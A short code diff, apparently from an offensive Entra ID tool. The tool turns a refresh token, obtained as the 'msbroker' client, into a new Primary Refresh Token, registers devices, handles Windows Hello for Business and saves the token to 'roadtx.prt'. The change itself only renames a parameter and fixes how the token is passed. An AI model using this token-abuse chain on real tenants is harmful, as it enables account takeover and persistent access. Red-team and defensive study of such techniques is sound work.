@@ -170,9 +170,9 @@ class deviceCode2WFH(Authentication,DeviceAuthentication):
         self.transportprivkey = self.privkey = serialization.load_pem_private_key(self.keydata, password=None)
         return True
     
-    def refreshtoken_to_prt_wrapper(self, msbroker_token):
+    def refreshtoken_to_prt_wrapper(self, refresh_token):
         print("[*] requesting new PRT with Entra ID using refresh token that we request previously as client 'msbroker': " + WELLKNOWN_CLIENTS["broker"])
-        prtdata = self.get_prt_with_refresh_token(msbroker_token["refreshToken"])
+        prtdata = self.get_prt_with_refresh_token(refresh_token)
         return prtdata
     
     def windows_hello_for_business(self, username, driver_path, proxy):
@@ -253,7 +253,7 @@ def main():
         certpem, privkey = action.register_entraid_devices()
         action.loadcert_in_mem(certpem, privkey)
   
-    prtdata = action.refreshtoken_to_prt_wrapper(token)
+    prtdata = action.refreshtoken_to_prt_wrapper(action.refresh_token)
     if prtdata:
         print("[✔] Congratulations! You got a new PRT!")
         action.saveprt(prtdata, prtfile="roadtx.prt")
